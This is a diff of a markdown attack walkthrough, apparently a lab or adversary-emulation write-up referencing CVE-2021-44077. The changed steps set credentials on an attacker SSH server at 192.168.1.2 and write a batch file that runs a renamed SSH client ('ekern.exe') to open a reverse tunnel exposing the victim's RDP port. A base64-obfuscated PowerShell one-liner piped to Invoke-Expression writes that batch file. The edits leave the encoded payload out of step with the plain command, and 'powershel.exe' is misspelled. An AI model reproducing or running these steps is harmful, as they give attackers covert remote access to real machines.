@@ -137,19 +137,28 @@
    f. download Bitvise SSH Server `192.168.1.2` and configure credentials
 
       username: H@ck3r
-      password: C@n't_D3f3nd_2021-44077
+      password: C@nt_D3f3nd_2021-44077
 
    g. let's write FXS.bat file to run `ekern.exe` and establish reverse SSH Connection to RDP
 
-      echo y|C:\Windows\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@n't_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.145:3389 192.168.1.2
+      echo y|C:\Users\Temp\ekern.exe -ssh -P 443 -l H@ck3r -pw C@nt_D3f3nd_2021-44077 -R 127.0.0.1:49800:192.168.20.150:3389 192.168.1.2
 
    h. another base64? no need to download it
 
-      powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxXaW5kb3dzXFRlbXBcRlhTLmJhdCcNClNldC1Db250ZW50IC1QYXRoICRiYXRjaEZpbGVQYXRoIC1WYWx1ZSAkYmF0Y2hDb250ZW50')) | Invoke-Expression}"
+      powershel.exe -Command "& {[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('JGJhdGNoQ29udGVudCA9ICdlY2hvIHl8QzpcV2luZG93c1xUZW1wXGVrZXJuLmV4ZSAtc3NoIC1QIDQ0MyAtbCBIQGNrM3IgLXB3IENAbnRfRDNmM25kXzIwMjEtNDQwNzcgLVIgMTI3LjAuMC4xOjQ5ODAwOjE5Mi4xNjguMjAuMTQ1OjMzODkgMTkyLjE2OC4xLjInDQokYmF0Y2hGaWxlUGF0aCA9ICdDOlxVc2Vyc1xWaWN0aW1cRG9jdW1lbnRzXEZYUy5iYXQnDQpTZXQtQ29udGVudCAtUGF0aCAkYmF0Y2hGaWxlUGF0aCAtVmFsdWUgJGJhdGNoQ29udGVudA==')) | Invoke-Expression}"
    
-   ![FXS](https://github.com/user-attachments/assets/80d229df-8c50-4153-8259-807ffb44a8e7)
+   ![image](https://github.com/user-attachments/assets/4f85fa3e-6cb0-48be-bc14-597ab146778a)
+
 
    j. let's run our batch now
+
+   ![image](https://github.com/user-attachments/assets/f149d6b7-6b3e-475f-b867-376a98ef18ba)
+
+
+   k. now It's RDP time
+
+
+   
 
 ------
 
